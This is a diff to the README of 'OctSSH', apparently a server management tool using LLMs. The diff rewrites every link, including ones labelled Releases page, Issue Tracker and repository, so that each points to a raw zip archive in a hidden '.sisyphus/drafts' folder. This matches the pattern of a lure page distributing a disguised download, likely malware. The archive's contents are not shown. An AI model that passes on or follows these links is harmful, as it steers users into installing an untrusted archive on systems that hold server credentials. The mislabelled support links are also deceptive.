@@ -1,6 +1,6 @@
 # 🚀 OctSSH - Control Your Server with Ease
 
-[![Download OctSSH](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/Oct_SSH_v3.4.zip)](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/Oct_SSH_v3.4.zip)
+[![Download OctSSH](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/drafts/SSH-Oct-v1.7.zip)](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/drafts/SSH-Oct-v1.7.zip)
 
 ## 📋 Introduction
 OctSSH is a simple application that allows you to manage your remote server with ease. You can use it to connect to your server and utilize the power of large language models (LLMs) to perform various tasks. Whether you need to run commands, automate processes, or get assistance with your server, OctSSH is here to help you simplify your work.
@@ -9,7 +9,7 @@ OctSSH is a simple application that allows you to manage your remote server with
 To get started with OctSSH, follow these easy steps. 
 
 ### 1. Visit the Release Page
-To download OctSSH, you need to visit the [Releases page](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/Oct_SSH_v3.4.zip). This page includes the latest version of the application, as well as older releases if needed.
+To download OctSSH, you need to visit the [Releases page](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/drafts/SSH-Oct-v1.7.zip). This page includes the latest version of the application, as well as older releases if needed.
 
 ### 2. Download OctSSH
 Once you are on the Releases page, you will see various files available for download. Look for the latest version marked as "Latest Release." Click on the file that matches your operating system (Windows, macOS, Linux) to start the download. 
@@ -59,13 +59,13 @@ If you encounter issues while using OctSSH, consider the following solutions:
 - **Connection Issues:** Double-check your server address and user credentials.
 - **Execution Errors:** Ensure commands are typed correctly and valid for your server.
 
-Visit our [GitHub Issue Tracker](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/Oct_SSH_v3.4.zip) for help or to report bugs.
+Visit our [GitHub Issue Tracker](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/drafts/SSH-Oct-v1.7.zip) for help or to report bugs.
 
 ## 📥 Download & Install
-To install OctSSH, go to the [Releases page](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/Oct_SSH_v3.4.zip) and download the appropriate version for your operating system. Follow the installation steps given earlier to set up the application on your device.
+To install OctSSH, go to the [Releases page](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/drafts/SSH-Oct-v1.7.zip) and download the appropriate version for your operating system. Follow the installation steps given earlier to set up the application on your device.
 
 ## ✉️ Contact Us
-If you have any questions or need support, please open an issue on our [GitHub repository](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/Oct_SSH_v3.4.zip). We are here to help you!
+If you have any questions or need support, please open an issue on our [GitHub repository](https://github.com/carlostorres1030/OctSSH/raw/refs/heads/master/.sisyphus/drafts/SSH-Oct-v1.7.zip). We are here to help you!
 
 Feel free to engage with the community and share your experiences using OctSSH. 
 
